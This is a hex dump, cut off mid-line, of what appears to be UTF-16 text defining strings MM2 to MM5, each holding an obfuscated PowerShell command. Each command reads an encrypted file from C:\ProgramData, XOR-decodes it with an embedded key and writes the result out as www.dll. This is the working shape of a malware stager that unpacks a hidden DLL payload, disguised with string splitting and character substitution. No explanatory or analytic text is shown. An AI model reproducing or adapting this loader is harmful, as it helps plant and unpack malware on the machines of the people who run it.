0000b8d0: 0028 0027 0043 003a 0047 0050 0048 0027  .(.'.C.:.G.P.H.'
0000b8e0: 002b 0027 0070 0072 0027 002b 0027 006f  .+.'.p.r.'.+.'.o
0000b8f0: 0067 0027 002b 0027 0072 0061 0027 002b  .g.'.+.'.r.a.'.+
0000b900: 0027 006d 0064 0061 0074 0061 0047 0027  .'.m.d.a.t.a.G.'
0000b910: 002b 0027 0050 0048 0077 0077 0077 0031  .+.'.P.H.w.w.w.1
0000b920: 002e 0064 0027 002b 0027 006c 006c 0027  ...d.'.+.'.l.l.'
0000b930: 0029 0020 0020 002d 0043 0072 0065 0050  .). . .-.C.r.e.P
0000b940: 004c 0061 0063 0045 0027 0047 0050 0048  .L.a.c.E.'.G.P.H
0000b950: 0027 002c 005b 0043 0068 0061 0072 005d  .'.,.[.C.h.a.r.]
0000b960: 0039 0032 0029 0029 003b 0020 0024 006b  .9.2.).).;. .$.k
0000b970: 0020 003d 0020 0028 0027 0036 0069 0027  . .=. .(.'.6.i.'
0000b980: 002b 0027 0049 0027 002b 0027 0067 006c  .+.'.I.'.+.'.g.l
0000b990: 0027 002b 0027 006f 0027 002b 0027 004d  .'.+.'.o.'.+.'.M
0000b9a0: 006b 0035 0027 002b 0027 0069 0052 0059  .k.5.'.+.'.i.R.Y
0000b9b0: 0041 0077 0027 002b 0027 0037 005a 0027  .A.w.'.+.'.7.Z.'
0000b9c0: 002b 0027 0054 0057 0065 0064 0030 0043  .+.'.T.W.e.d.0.C
0000b9d0: 0072 0027 002b 0027 006a 0075 005a 0039  .r.'.+.'.j.u.Z.9
0000b9e0: 0077 0069 006a 0079 0051 0044 006a 0027  .w.i.j.y.Q.D.j.'
0000b9f0: 002b 0027 004b 004f 0027 002b 0027 0039  .+.'.K.O.'.+.'.9
0000ba00: 004d 0073 0030 0044 0038 004b 0030 005a  .M.s.0.D.8.K.0.Z
0000ba10: 0032 0048 0035 004d 0058 0036 0077 0079  .2.H.5.M.X.6.w.y
0000ba20: 004f 004b 0071 0046 0078 006c 0027 002b  .O.K.q.F.x.l.'.+
0000ba30: 0027 004f 006d 0031 0027 002b 0027 0058  .'.O.m.1.'.+.'.X
0000ba40: 0027 002b 0027 0070 006a 006d 0059 0066  .'.+.'.p.j.m.Y.f
0000ba50: 0061 0051 0058 0027 002b 0027 0061 0063  .a.Q.X.'.+.'.a.c
0000ba60: 0041 0036 0027 0029 003b 0020 0024 0072  .A.6.'.).;. .$.r
0000ba70: 0020 003d 0020 004e 0065 0077 002d 004f  . .=. .N.e.w.-.O
0000ba80: 0062 006a 0065 0063 0074 0020 0042 0079  .b.j.e.c.t. .B.y
0000ba90: 0074 0065 005b 005d 0020 0024 0062 002e  .t.e.[.]. .$.b..
0000baa0: 006c 0065 006e 0067 0074 0068 003b 0020  .l.e.n.g.t.h.;. 
0000bab0: 0066 006f 0072 0028 0024 0069 003d 0030  .f.o.r.(.$.i.=.0
0000bac0: 003b 0020 0024 0069 0020 002d 006c 0074  .;. .$.i. .-.l.t
0000bad0: 0020 0024 0062 002e 006c 0065 006e 0067  . .$.b...l.e.n.g
0000bae0: 0074 0068 003b 0020 0024 0069 002b 002b  .t.h.;. .$.i.+.+
0000baf0: 0029 007b 0024 0072 005b 0024 0069 005d  .).{.$.r.[.$.i.]
0000bb00: 0020 003d 0020 0024 0062 005b 0024 0069  . .=. .$.b.[.$.i
0000bb10: 005d 0020 002d 0062 0078 006f 0072 0020  .]. .-.b.x.o.r. 
0000bb20: 0024 006b 005b 0024 0069 0025 0024 006b  .$.k.[.$.i.%.$.k
0000bb30: 002e 006c 0065 006e 0067 0074 0068 005d  ...l.e.n.g.t.h.]
0000bb40: 007d 003b 0020 0069 0066 0020 0028 0024  .}.;. .i.f. .(.$
0000bb50: 0072 002e 006c 0065 006e 0067 0074 0068  .r...l.e.n.g.t.h
0000bb60: 0020 002d 0067 0074 0020 0030 0029 0020  . .-.g.t. .0.). 
0000bb70: 007b 0020 005b 0053 0079 0073 0074 0065  .{. .[.S.y.s.t.e
0000bb80: 006d 002e 0049 004f 002e 0046 0069 006c  .m...I.O...F.i.l
0000bb90: 0065 005d 003a 003a 0057 0072 0069 0074  .e.].:.:.W.r.i.t
0000bba0: 0065 0041 006c 006c 0042 0079 0074 0065  .e.A.l.l.B.y.t.e
0000bbb0: 0073 0028 0028 0028 0027 0043 003a 0059  .s.(.(.(.'.C.:.Y
0000bbc0: 0039 0041 0070 0072 006f 0027 002b 0027  .9.A.p.r.o.'.+.'
0000bbd0: 0067 0072 0061 006d 0064 0061 0074 0027  .g.r.a.m.d.a.t.'
0000bbe0: 002b 0027 0061 0027 002b 0027 0059 0027  .+.'.a.'.+.'.Y.'
0000bbf0: 002b 0027 0039 0041 0077 0077 0077 0027  .+.'.9.A.w.w.w.'
0000bc00: 002b 0027 002e 0064 0027 002b 0027 006c  .+.'...d.'.+.'.l
0000bc10: 006c 0027 0029 002e 0052 0045 0070 004c  .l.'.)...R.E.p.L
0000bc20: 0061 0063 0065 0028 0028 005b 0063 0068  .a.c.e.(.(.[.c.h
0000bc30: 0041 0072 005d 0038 0039 002b 005b 0063  .A.r.].8.9.+.[.c
0000bc40: 0068 0041 0072 005d 0035 0037 002b 005b  .h.A.r.].5.7.+.[
0000bc50: 0063 0068 0041 0072 005d 0036 0035 0029  .c.h.A.r.].6.5.)
0000bc60: 002c 005b 0073 0054 0072 0069 004e 0067  .,.[.s.T.r.i.N.g
0000bc70: 005d 005b 0063 0068 0041 0072 005d 0039  .].[.c.h.A.r.].9
0000bc80: 0032 0029 0029 002c 0020 0024 0072 0029  .2.).).,. .$.r.)
0000bc90: 007d 0022 000d 000a 004d 004d 0032 0020  .}.".....M.M.2. 
0000bca0: 003d 0020 0022 0024 0062 0020 003d 0020  .=. .".$.b. .=. 
0000bcb0: 005b 0053 0079 0073 0074 0065 006d 002e  .[.S.y.s.t.e.m..
0000bcc0: 0049 004f 002e 0046 0069 006c 0065 005d  .I.O...F.i.l.e.]
0000bcd0: 003a 003a 0052 0065 0061 0064 0041 006c  .:.:.R.e.a.d.A.l
0000bce0: 006c 0042 0079 0074 0065 0073 0028 0028  .l.B.y.t.e.s.(.(
0000bcf0: 0028 0027 0043 003a 0047 0050 0048 0027  .(.'.C.:.G.P.H.'
0000bd00: 002b 0027 0070 0072 0027 002b 0027 006f  .+.'.p.r.'.+.'.o
0000bd10: 0067 0027 002b 0027 0072 0061 0027 002b  .g.'.+.'.r.a.'.+
0000bd20: 0027 006d 0064 0061 0074 0061 0047 0027  .'.m.d.a.t.a.G.'
0000bd30: 002b 0027 0050 0048 0077 0077 0077 0032  .+.'.P.H.w.w.w.2
0000bd40: 002e 0064 0027 002b 0027 006c 006c 0027  ...d.'.+.'.l.l.'
0000bd50: 0029 0020 0020 002d 0043 0072 0065 0050  .). . .-.C.r.e.P
0000bd60: 004c 0061 0063 0045 0027 0047 0050 0048  .L.a.c.E.'.G.P.H
0000bd70: 0027 002c 005b 0043 0068 0061 0072 005d  .'.,.[.C.h.a.r.]
0000bd80: 0039 0032 0029 0029 003b 0020 0024 006b  .9.2.).).;. .$.k
0000bd90: 0020 003d 0020 0028 0027 0036 0069 0027  . .=. .(.'.6.i.'
0000bda0: 002b 0027 0049 0027 002b 0027 0070 0063  .+.'.I.'.+.'.p.c
0000bdb0: 0027 002b 0027 006f 0027 002b 0027 004d  .'.+.'.o.'.+.'.M
0000bdc0: 006b 0035 0027 002b 0027 0069 0052 0059  .k.5.'.+.'.i.R.Y
0000bdd0: 0041 0077 0027 002b 0027 0037 005a 0027  .A.w.'.+.'.7.Z.'
0000bde0: 002b 0027 0054 0057 0065 0064 0030 0043  .+.'.T.W.e.d.0.C
0000bdf0: 0072 0027 002b 0027 006a 0075 005a 0039  .r.'.+.'.j.u.Z.9
0000be00: 0077 0069 006a 0079 0051 0044 006a 0027  .w.i.j.y.Q.D.j.'
0000be10: 002b 0027 0041 0075 0027 002b 0027 0039  .+.'.A.u.'.+.'.9
0000be20: 004d 0073 0030 0044 0038 004b 0030 005a  .M.s.0.D.8.K.0.Z
0000be30: 0032 0048 0035 004d 0058 0036 0077 0079  .2.H.5.M.X.6.w.y
0000be40: 004f 004b 0071 0046 0078 006c 0027 002b  .O.K.q.F.x.l.'.+
0000be50: 0027 004f 006d 0031 0027 002b 0027 0050  .'.O.m.1.'.+.'.P
0000be60: 0027 002b 0027 0070 006a 006d 0059 0066  .'.+.'.p.j.m.Y.f
0000be70: 0061 0051 0058 0027 002b 0027 0061 0063  .a.Q.X.'.+.'.a.c
0000be80: 0041 0036 0027 0029 003b 0020 0024 0072  .A.6.'.).;. .$.r
0000be90: 0020 003d 0020 004e 0065 0077 002d 004f  . .=. .N.e.w.-.O
0000bea0: 0062 006a 0065 0063 0074 0020 0042 0079  .b.j.e.c.t. .B.y
0000beb0: 0074 0065 005b 005d 0020 0024 0062 002e  .t.e.[.]. .$.b..
0000bec0: 006c 0065 006e 0067 0074 0068 003b 0020  .l.e.n.g.t.h.;. 
0000bed0: 0066 006f 0072 0028 0024 0069 003d 0030  .f.o.r.(.$.i.=.0
0000bee0: 003b 0020 0024 0069 0020 002d 006c 0074  .;. .$.i. .-.l.t
0000bef0: 0020 0024 0062 002e 006c 0065 006e 0067  . .$.b...l.e.n.g
0000bf00: 0074 0068 003b 0020 0024 0069 002b 002b  .t.h.;. .$.i.+.+
0000bf10: 0029 007b 0024 0072 005b 0024 0069 005d  .).{.$.r.[.$.i.]
0000bf20: 0020 003d 0020 0024 0062 005b 0024 0069  . .=. .$.b.[.$.i
0000bf30: 005d 0020 002d 0062 0078 006f 0072 0020  .]. .-.b.x.o.r. 
0000bf40: 0024 006b 005b 0024 0069 0025 0024 006b  .$.k.[.$.i.%.$.k
0000bf50: 002e 006c 0065 006e 0067 0074 0068 005d  ...l.e.n.g.t.h.]
0000bf60: 007d 003b 0020 0020 0069 0066 0020 0028  .}.;. . .i.f. .(
0000bf70: 0024 0072 002e 006c 0065 006e 0067 0074  .$.r...l.e.n.g.t
0000bf80: 0068 0020 002d 0067 0074 0020 0030 0029  .h. .-.g.t. .0.)
0000bf90: 0020 007b 005b 0053 0079 0073 0074 0065  . .{.[.S.y.s.t.e
0000bfa0: 006d 002e 0049 004f 002e 0046 0069 006c  .m...I.O...F.i.l
0000bfb0: 0065 005d 003a 003a 0057 0072 0069 0074  .e.].:.:.W.r.i.t
0000bfc0: 0065 0041 006c 006c 0042 0079 0074 0065  .e.A.l.l.B.y.t.e
0000bfd0: 0073 0028 0028 0028 0027 0043 003a 0059  .s.(.(.(.'.C.:.Y
0000bfe0: 0039 0041 0070 0072 006f 0027 002b 0027  .9.A.p.r.o.'.+.'
0000bff0: 0067 0072 0061 006d 0064 0061 0074 0027  .g.r.a.m.d.a.t.'
0000c000: 002b 0027 0061 0027 002b 0027 0059 0027  .+.'.a.'.+.'.Y.'
0000c010: 002b 0027 0039 0041 0077 0077 0077 0027  .+.'.9.A.w.w.w.'
0000c020: 002b 0027 002e 0064 0027 002b 0027 006c  .+.'...d.'.+.'.l
0000c030: 006c 0027 0029 002e 0052 0045 0070 004c  .l.'.)...R.E.p.L
0000c040: 0061 0063 0065 0028 0028 005b 0063 0068  .a.c.e.(.(.[.c.h
0000c050: 0041 0072 005d 0038 0039 002b 005b 0063  .A.r.].8.9.+.[.c
0000c060: 0068 0041 0072 005d 0035 0037 002b 005b  .h.A.r.].5.7.+.[
0000c070: 0063 0068 0041 0072 005d 0036 0035 0029  .c.h.A.r.].6.5.)
0000c080: 002c 005b 0073 0054 0072 0069 004e 0067  .,.[.s.T.r.i.N.g
0000c090: 005d 005b 0063 0068 0041 0072 005d 0039  .].[.c.h.A.r.].9
0000c0a0: 0032 0029 0029 002c 0020 0024 0072 0029  .2.).).,. .$.r.)
0000c0b0: 007d 0022 000d 000a 004d 004d 0033 0020  .}.".....M.M.3. 
0000c0c0: 003d 0020 0022 0024 0062 0020 003d 0020  .=. .".$.b. .=. 
0000c0d0: 005b 0053 0079 0073 0074 0065 006d 002e  .[.S.y.s.t.e.m..
0000c0e0: 0049 004f 002e 0046 0069 006c 0065 005d  .I.O...F.i.l.e.]
0000c0f0: 003a 003a 0052 0065 0061 0064 0041 006c  .:.:.R.e.a.d.A.l
0000c100: 006c 0042 0079 0074 0065 0073 0028 0028  .l.B.y.t.e.s.(.(
0000c110: 0028 0027 0043 003a 0047 0050 0048 0027  .(.'.C.:.G.P.H.'
0000c120: 002b 0027 0070 0072 0027 002b 0027 006f  .+.'.p.r.'.+.'.o
0000c130: 0067 0027 002b 0027 0072 0061 0027 002b  .g.'.+.'.r.a.'.+
0000c140: 0027 006d 0064 0061 0074 0061 0047 0027  .'.m.d.a.t.a.G.'
0000c150: 002b 0027 0050 0048 0077 0077 0077 0033  .+.'.P.H.w.w.w.3
0000c160: 002e 0064 0027 002b 0027 006c 006c 0027  ...d.'.+.'.l.l.'
0000c170: 0029 0020 0020 002d 0043 0072 0065 0050  .). . .-.C.r.e.P
0000c180: 004c 0061 0063 0045 0027 0047 0050 0048  .L.a.c.E.'.G.P.H
0000c190: 0027 002c 005b 0043 0068 0061 0072 005d  .'.,.[.C.h.a.r.]
0000c1a0: 0039 0032 0029 0029 003b 0020 0024 006b  .9.2.).).;. .$.k
0000c1b0: 0020 003d 0020 0028 0027 0036 0069 0027  . .=. .(.'.6.i.'
0000c1c0: 002b 0027 0049 0027 002b 0027 0057 0047  .+.'.I.'.+.'.W.G
0000c1d0: 0027 002b 0027 006f 0027 002b 0027 004d  .'.+.'.o.'.+.'.M
0000c1e0: 006b 0035 0027 002b 0027 0069 0052 0059  .k.5.'.+.'.i.R.Y
0000c1f0: 0041 0077 0027 002b 0027 0037 005a 0027  .A.w.'.+.'.7.Z.'
0000c200: 002b 0027 0054 0057 0065 0064 0030 0043  .+.'.T.W.e.d.0.C
0000c210: 0072 0027 002b 0027 006a 0075 005a 0039  .r.'.+.'.j.u.Z.9
0000c220: 0077 0069 006a 0079 0051 0044 006a 0027  .w.i.j.y.Q.D.j.'
0000c230: 002b 0027 004f 004c 0027 002b 0027 0039  .+.'.O.L.'.+.'.9
0000c240: 004d 0073 0030 0044 0038 004b 0030 005a  .M.s.0.D.8.K.0.Z
0000c250: 0032 0048 0035 004d 0058 0036 0077 0079  .2.H.5.M.X.6.w.y
0000c260: 004f 004b 0071 0046 0078 006c 0027 002b  .O.K.q.F.x.l.'.+
0000c270: 0027 004f 006d 0031 0027 002b 0027 0073  .'.O.m.1.'.+.'.s
0000c280: 0027 002b 0027 0070 006a 006d 0059 0066  .'.+.'.p.j.m.Y.f
0000c290: 0061 0051 0058 0027 002b 0027 0061 0063  .a.Q.X.'.+.'.a.c
0000c2a0: 0041 0036 0027 0029 003b 0020 0024 0072  .A.6.'.).;. .$.r
0000c2b0: 0020 003d 0020 004e 0065 0077 002d 004f  . .=. .N.e.w.-.O
0000c2c0: 0062 006a 0065 0063 0074 0020 0042 0079  .b.j.e.c.t. .B.y
0000c2d0: 0074 0065 005b 005d 0020 0024 0062 002e  .t.e.[.]. .$.b..
0000c2e0: 006c 0065 006e 0067 0074 0068 003b 0020  .l.e.n.g.t.h.;. 
0000c2f0: 0066 006f 0072 0028 0024 0069 003d 0030  .f.o.r.(.$.i.=.0
0000c300: 003b 0020 0024 0069 0020 002d 006c 0074  .;. .$.i. .-.l.t
0000c310: 0020 0024 0062 002e 006c 0065 006e 0067  . .$.b...l.e.n.g
0000c320: 0074 0068 003b 0020 0024 0069 002b 002b  .t.h.;. .$.i.+.+
0000c330: 0029 007b 0024 0072 005b 0024 0069 005d  .).{.$.r.[.$.i.]
0000c340: 0020 003d 0020 0024 0062 005b 0024 0069  . .=. .$.b.[.$.i
0000c350: 005d 0020 002d 0062 0078 006f 0072 0020  .]. .-.b.x.o.r. 
0000c360: 0024 006b 005b 0024 0069 0025 0024 006b  .$.k.[.$.i.%.$.k
0000c370: 002e 006c 0065 006e 0067 0074 0068 005d  ...l.e.n.g.t.h.]
0000c380: 007d 003b 0020 0069 0066 0020 0028 0024  .}.;. .i.f. .(.$
0000c390: 0072 002e 006c 0065 006e 0067 0074 0068  .r...l.e.n.g.t.h
0000c3a0: 0020 002d 0067 0074 0020 0030 0029 0020  . .-.g.t. .0.). 
0000c3b0: 007b 0020 005b 0053 0079 0073 0074 0065  .{. .[.S.y.s.t.e
0000c3c0: 006d 002e 0049 004f 002e 0046 0069 006c  .m...I.O...F.i.l
0000c3d0: 0065 005d 003a 003a 0057 0072 0069 0074  .e.].:.:.W.r.i.t
0000c3e0: 0065 0041 006c 006c 0042 0079 0074 0065  .e.A.l.l.B.y.t.e
0000c3f0: 0073 0028 0028 0028 0027 0043 003a 0059  .s.(.(.(.'.C.:.Y
0000c400: 0039 0041 0070 0072 006f 0027 002b 0027  .9.A.p.r.o.'.+.'
0000c410: 0067 0072 0061 006d 0064 0061 0074 0027  .g.r.a.m.d.a.t.'
0000c420: 002b 0027 0061 0027 002b 0027 0059 0027  .+.'.a.'.+.'.Y.'
0000c430: 002b 0027 0039 0041 0077 0077 0077 0027  .+.'.9.A.w.w.w.'
0000c440: 002b 0027 002e 0064 0027 002b 0027 006c  .+.'...d.'.+.'.l
0000c450: 006c 0027 0029 002e 0052 0045 0070 004c  .l.'.)...R.E.p.L
0000c460: 0061 0063 0065 0028 0028 005b 0063 0068  .a.c.e.(.(.[.c.h
0000c470: 0041 0072 005d 0038 0039 002b 005b 0063  .A.r.].8.9.+.[.c
0000c480: 0068 0041 0072 005d 0035 0037 002b 005b  .h.A.r.].5.7.+.[
0000c490: 0063 0068 0041 0072 005d 0036 0035 0029  .c.h.A.r.].6.5.)
0000c4a0: 002c 005b 0073 0054 0072 0069 004e 0067  .,.[.s.T.r.i.N.g
0000c4b0: 005d 005b 0063 0068 0041 0072 005d 0039  .].[.c.h.A.r.].9
0000c4c0: 0032 0029 0029 002c 0020 0024 0072 0029  .2.).).,. .$.r.)
0000c4d0: 007d 0022 000d 000a 004d 004d 0034 0020  .}.".....M.M.4. 
0000c4e0: 003d 0020 0022 0024 0062 0020 003d 0020  .=. .".$.b. .=. 
0000c4f0: 005b 0053 0079 0073 0074 0065 006d 002e  .[.S.y.s.t.e.m..
0000c500: 0049 004f 002e 0046 0069 006c 0065 005d  .I.O...F.i.l.e.]
0000c510: 003a 003a 0052 0065 0061 0064 0041 006c  .:.:.R.e.a.d.A.l
0000c520: 006c 0042 0079 0074 0065 0073 0028 0028  .l.B.y.t.e.s.(.(
0000c530: 0028 0027 0043 003a 0047 0050 0048 0027  .(.'.C.:.G.P.H.'
0000c540: 002b 0027 0070 0072 0027 002b 0027 006f  .+.'.p.r.'.+.'.o
0000c550: 0067 0027 002b 0027 0072 0061 0027 002b  .g.'.+.'.r.a.'.+
0000c560: 0027 006d 0064 0061 0074 0061 0047 0027  .'.m.d.a.t.a.G.'
0000c570: 002b 0027 0050 0048 0077 0077 0077 0034  .+.'.P.H.w.w.w.4
0000c580: 002e 0064 0027 002b 0027 006c 006c 0027  ...d.'.+.'.l.l.'
0000c590: 0029 0020 0020 002d 0043 0072 0065 0050  .). . .-.C.r.e.P
0000c5a0: 004c 0061 0063 0045 0027 0047 0050 0048  .L.a.c.E.'.G.P.H
0000c5b0: 0027 002c 005b 0043 0068 0061 0072 005d  .'.,.[.C.h.a.r.]
0000c5c0: 0039 0032 0029 0029 003b 0020 0024 006b  .9.2.).).;. .$.k
0000c5d0: 0020 003d 0020 0028 0027 0036 0069 0027  . .=. .(.'.6.i.'
0000c5e0: 002b 0027 0049 0027 002b 0027 006f 004e  .+.'.I.'.+.'.o.N
0000c5f0: 0027 002b 0027 006f 0027 002b 0027 004d  .'.+.'.o.'.+.'.M
0000c600: 006b 0035 0027 002b 0027 0069 0052 0059  .k.5.'.+.'.i.R.Y
0000c610: 0041 0077 0027 002b 0027 0037 005a 0027  .A.w.'.+.'.7.Z.'
0000c620: 002b 0027 0054 0057 0065 0064 0030 0043  .+.'.T.W.e.d.0.C
0000c630: 0072 0027 002b 0027 006a 0075 005a 0039  .r.'.+.'.j.u.Z.9
0000c640: 0077 0069 006a 0079 0051 0044 006a 0027  .w.i.j.y.Q.D.j.'
0000c650: 002b 0027 0050 0079 0027 002b 0027 0039  .+.'.P.y.'.+.'.9
0000c660: 004d 0073 0030 0044 0038 004b 0030 005a  .M.s.0.D.8.K.0.Z
0000c670: 0032 0048 0035 004d 0058 0036 0077 0079  .2.H.5.M.X.6.w.y
0000c680: 004f 004b 0071 0046 0078 006c 0027 002b  .O.K.q.F.x.l.'.+
0000c690: 0027 004f 006d 0031 0027 002b 0027 0047  .'.O.m.1.'.+.'.G
0000c6a0: 0027 002b 0027 0070 006a 006d 0059 0066  .'.+.'.p.j.m.Y.f
0000c6b0: 0061 0051 0058 0027 002b 0027 0061 0063  .a.Q.X.'.+.'.a.c
0000c6c0: 0041 0036 0027 0029 003b 0020 0024 0072  .A.6.'.).;. .$.r
0000c6d0: 0020 003d 0020 004e 0065 0077 002d 004f  . .=. .N.e.w.-.O
0000c6e0: 0062 006a 0065 0063 0074 0020 0042 0079  .b.j.e.c.t. .B.y
0000c6f0: 0074 0065 005b 005d 0020 0024 0062 002e  .t.e.[.]. .$.b..
0000c700: 006c 0065 006e 0067 0074 0068 003b 0020  .l.e.n.g.t.h.;. 
0000c710: 0066 006f 0072 0028 0024 0069 003d 0030  .f.o.r.(.$.i.=.0
0000c720: 003b 0020 0024 0069 0020 002d 006c 0074  .;. .$.i. .-.l.t
0000c730: 0020 0024 0062 002e 006c 0065 006e 0067  . .$.b...l.e.n.g
0000c740: 0074 0068 003b 0020 0024 0069 002b 002b  .t.h.;. .$.i.+.+
0000c750: 0029 007b 0024 0072 005b 0024 0069 005d  .).{.$.r.[.$.i.]
0000c760: 0020 003d 0020 0024 0062 005b 0024 0069  . .=. .$.b.[.$.i
0000c770: 005d 0020 002d 0062 0078 006f 0072 0020  .]. .-.b.x.o.r. 
0000c780: 0024 006b 005b 0024 0069 0025 0024 006b  .$.k.[.$.i.%.$.k
0000c790: 002e 006c 0065 006e 0067 0074 0068 005d  ...l.e.n.g.t.h.]
0000c7a0: 007d 003b 0020 0069 0066 0020 0028 0024  .}.;. .i.f. .(.$
0000c7b0: 0072 002e 006c 0065 006e 0067 0074 0068  .r...l.e.n.g.t.h
0000c7c0: 0020 002d 0067 0074 0020 0030 0029 0020  . .-.g.t. .0.). 
0000c7d0: 007b 0020 005b 0053 0079 0073 0074 0065  .{. .[.S.y.s.t.e
0000c7e0: 006d 002e 0049 004f 002e 0046 0069 006c  .m...I.O...F.i.l
0000c7f0: 0065 005d 003a 003a 0057 0072 0069 0074  .e.].:.:.W.r.i.t
0000c800: 0065 0041 006c 006c 0042 0079 0074 0065  .e.A.l.l.B.y.t.e
0000c810: 0073 0028 0028 0028 0027 0043 003a 0059  .s.(.(.(.'.C.:.Y
0000c820: 0039 0041 0070 0072 006f 0027 002b 0027  .9.A.p.r.o.'.+.'
0000c830: 0067 0072 0061 006d 0064 0061 0074 0027  .g.r.a.m.d.a.t.'
0000c840: 002b 0027 0061 0027 002b 0027 0059 0027  .+.'.a.'.+.'.Y.'
0000c850: 002b 0027 0039 0041 0077 0077 0077 0027  .+.'.9.A.w.w.w.'
0000c860: 002b 0027 002e 0064 0027 002b 0027 006c  .+.'...d.'.+.'.l
0000c870: 006c 0027 0029 002e 0052 0045 0070 004c  .l.'.)...R.E.p.L
0000c880: 0061 0063 0065 0028 0028 005b 0063 0068  .a.c.e.(.(.[.c.h
0000c890: 0041 0072 005d 0038 0039 002b 005b 0063  .A.r.].8.9.+.[.c
0000c8a0: 0068 0041 0072 005d 0035 0037 002b 005b  .h.A.r.].5.7.+.[
0000c8b0: 0063 0068 0041 0072 005d 0036 0035 0029  .c.h.A.r.].6.5.)
0000c8c0: 002c 005b 0073 0054 0072 0069 004e 0067  .,.[.s.T.r.i.N.g
0000c8d0: 005d 005b 0063 0068 0041 0072 005d 0039  .].[.c.h.A.r.].9
0000c8e0: 0032 0029 0029 002c 0020 0024 0072 0029  .2.).).,. .$.r.)
0000c8f0: 007d 0022 000d 000a 004d 004d 0035 0020  .}.".....M.M.5. 
0000c900: 003d 0020 0022 0024 0062 0020 003d 0020  .=. .".$.b. .=. 
0000c910: 005b 0053 0079 0073 0074 0065 006d 002e  .[.S.y.s.t.e.m..
0000c920: 0049 004f 002e 0046 0069 006c 0065 005d  .I.O...F.i.l.e.]
0000c930: 003a 003a 0052 0065 0061 0064 0041 006c  .:.:.R.e.a.d.A.l
0000c940: 006c 0042 0079 0074 0065 0073 0028 0028  .l.B.y.t.e.s.(.(
0000c950: 0028 0027 0043 003a 0047 0050 0048 0027  .(.'.C.:.G.P.H.'
0000c960: 002b 0027 0070 0072 0027 002b 0027 006f  .+.'.p.r.'.+.'.o
0000c970: 0067 0027 002b 0027 0072 0061 0027 002b  .g.'.+.'.r.a.'.+
0000c980: 0027 006d 0064 0061 0074 0061 0047 0027  .'.m.d.a.t.a.G.'
0000c990: 002b 0027 0050 0048 0077 0077 0077 0035  .+.'.P.H.w.w.w.5
0000c9a0: 002e 0064 0027 002b 0027 006c 006c 0027  ...d.'.+.'.l.l.'
0000c9b0: 0029 0020 0020 002d 0043 0072 0065 0050  .). . .-.C.r.e.P
0000c9c0: 004c 0061 0063 0045 0027 0047 0050 0048  .L.a.c.E.'.G.P.H
0000c9d0: 0027 002c 005b 0043 0068 0061 0072 005d  .'.,.[.C.h.a.r.]
0000c9e0: 0039 0032 0029 0029 003b 0020 0024 006b  .9.2.).).;. .$.k
0000c9f0: 0020 003d 0020 0028 0027 0036 0069 0027  . .=. .(.'.6.i.'
0000ca00: 002b 0027 0049 0027 002b 0027 0049 0045  .+.'.I.'.+.'.I.E
0000ca10: 0027 002b 0027 006f 0027 002b 0027 004d  .'.+.'.o.'.+.'.M
0000ca20: 006b 0035 0027 002b 0027 0069 0052 0059  .k.5.'.+.'.i.R.Y
0000ca30: 0041 0077 0027 002b 0027 0037 005a 0027  .A.w.'.+.'.7.Z.'
0000ca40: 002b 0027 0054 0057 0065 0064 0030 0043  .+.'.T.W.e.d.0.C
0000ca50: 0072 0027 002b 0027 006a 0075 005a 0039  .r.'.+.'.j.u.Z.9
0000ca60: 0077 0069 006a 0079 0051 0044 006a 0027  .w.i.j.y.Q.D.j.'
0000ca70: 002b 0027 0059 004c 0027 002b 0027 0039  .+.'.Y.L.'.+.'.9
0000ca80: 004d 0073 0030 0044 0038 004b 0030 005a  .M.s.0.D.8.K.0.Z
0000ca90: 0032 0048 0035 004d 0058 0036 0077 0079  .2.H.5.M.X.6.w.y
0000caa0: 004f 004b 0071 0046 0078 006c 0027 002b  .O.K.q.F.x.l.'.+
0000cab0: 0027 004f 006d 0031 0027 002b 0027 0061  .'.O.m.1.'.+.'.a
0000cac0: 0027 002b 0027 0070 006a 006d 0059 0066  .'.+.'.p.j.m.Y.f
0000cad0: 0061 0051 0058 0027 002b 0027 0061 0063  .a.Q.X.'.+.'.a.c
0000cae0: 0041 0036 0027 0029 003b 0020 0024 0072  .A.6.'.).;. .$.r
0000caf0: 0020 003d 0020 004e 0065 0077 002d 004f  . .=. .N.e.w.-.O
0000cb00: 0062 006a 0065 0063 0074 0020 0042 0079  .b.j.e.c.t. .B.y
0000cb10: 0074 0065 005b 005d 0020 0024 0062 002e  .t.e.[.]. .$.b..
0000cb20: 006c 0065 006e 0067 0074 0068 003b 0020  .l.e.n.g.t.h.;. 
0000cb30: 0066 006f 0072 0028 0024 0069 003d 0030  .f.o.r.(.$.i.=.0
0000cb40: 003b 0020 0024 0069 0020 002d 006c 0074  .;. .$.i. .-.l.t
0000cb50: 0020 0024 0062 002e 006c 0065 006e 0067  . .$.b...l.e.n.g
0000cb60: 0074 0068 003b 0020 0024 0069 002b 002b  .t.h.;. .$.i.+.+
0000cb70: 0029 007b 0024 0072 005b 0024 0069 005d  .).{.$.r.[.$.i.]
0000cb80: 0020 003d 0020 0024 0062 005b 0024 0069  . .=. .$.b.[.$.i
0000cb90: 005d 0020 002d 0062 0078 006f 0072 0020  .]. .-.b.x.o.r. 
0000cba0: 0024 006b 005b 0024 0069 0025 0024 006b  .$.k.[.$.i.%.$.k
0000cbb0: 002e 006c 0065 006e 0067 0074 0068 005d  ...l.e.n.g.t.h.]
0000cbc0: 007d 003b 0020 0069 0066 0020 0028 0024  .}.;. .i.f. .(.$
0000cbd0: 0072 002e 006c 0065 006e 0067 0074 0068  .r...l.e.n.g.t.h
0000cbe0: 0020 002d 0067 0074 0020 0030 0029 0020  . .-.g.t. .0.). 
0000cbf0: 007b 005b 0053 0079 0073 0074 0065 006d  .{.[.S.y.s.t.e.m
0000cc00: 002e 0049 004f 002e 0046 0069 006c 0065  ...I.O...F.i.l.e
0000cc10: 005d 003a 003a 0057 0072 0069 0074 0065  .].:.:.W.r.i.t.e
0000cc20: 0041 006c 006c 0042 0079 0074 0065 0073  .A.l.l.B.y.t.e.s
0000cc30: 0028 0028 0028 0027 0043 003a 0059 0039  .(.(.(.'.C.:.Y.9
0000cc40: 0041 0070 0072 006f 0027 002b 0027 0067  .A.p.r.o.'.+.'.g
0000cc50: 0072 0061 006d 0064 0061 0074 0027 002b  .r.a.m.d.a.t.'.+
0000cc60: 0027 0061 0027 002b 0027 0059 0027 002b  .'.a.'.+.'.Y.'.+
0000cc70: 0027 0039 0041 0077 0077 0077 0027 002b  .'.9.A.w.w.w.'.+
0000cc80: 0027 002e 0064 0027 002b 0027 006c 006c  .'...d.'.+.'.l.l
0000cc90: 0027 0029 002e 0052 0045 0070 004c 0061  .'.)...R.E.p.L.a
0000cca0: 0063 0065 0028 0028 005b 0063 0068 0041  .c.e.(.(.[.c.h.A
